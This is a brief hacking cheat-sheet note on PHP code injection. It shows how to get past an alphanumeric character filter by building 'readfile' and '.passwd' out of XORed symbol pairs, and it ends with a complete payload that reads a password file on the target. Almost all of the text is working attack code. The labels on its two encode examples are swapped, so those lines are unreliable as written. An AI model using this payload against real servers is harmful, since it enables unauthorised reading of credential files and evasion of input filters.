#code_injection #php 

## Filter Alphanumeric Chars
https://github.com/mucomplex/PHP_alphanumeric_encoder 

Encode `readfile`:
```php
python3 alpha_exploit.py readfile xor "\`\\&"
→".".('0'^'@').(':'^'[').('@'^'3').('['^'(').('['^',').('['^'?');
```

Encode `.passwd`:
```php
python3 alpha_exploit.py .passwd xor "\`\\&"
→('2'^'@').('8'^']').('!'^'@').('$'^'@').(';'^']').('@'^')').('@'^',').('['^'>');
$__($_);
```

Final payload:
```php
$_=".".('0'^'@').(':'^'[').('@'^'3').('['^'(').('['^',').('['^'?');$__=('2'^'@').('8'^']').('!'^'@').('$'^'@').(';'^']').('@'^')').('@'^',').('['^'>');$__($_);

```